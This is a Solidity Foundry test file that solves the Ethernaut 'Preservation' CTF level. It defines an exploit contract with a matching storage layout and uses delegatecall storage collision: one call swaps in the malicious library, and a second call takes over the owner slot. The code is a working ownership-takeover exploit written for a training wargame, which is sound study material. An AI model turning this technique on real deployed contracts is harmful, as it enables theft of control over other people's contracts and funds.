// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../ethernaut/Preservation.sol";


contract ExploitPreservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _address) public {
        owner = address(uint160(_address));
    }
}


contract TestPreservation is Test {
    Preservation preservation;
    ExploitPreservation exploitPreservation;
    address deployer = address(0x51);
    address attacker = address(0x52);

    function setUp() external {
        vm.startPrank(deployer);
        preservation = new Preservation(
           address(new LibraryContract()), address(new LibraryContract())
        );
        exploitPreservation = new ExploitPreservation();
        vm.stopPrank();
    }

    function testExploit() external {
        assertTrue(preservation.timeZone1Library() != preservation.timeZone2Library());
        preservation.setFirstTime(uint(uint160(address(exploitPreservation))));
        assertEq(preservation.timeZone1Library(), address(exploitPreservation));
        preservation.setFirstTime(uint(uint160(address(attacker))));
        assertEq(preservation.owner(), address(attacker));
    }
}
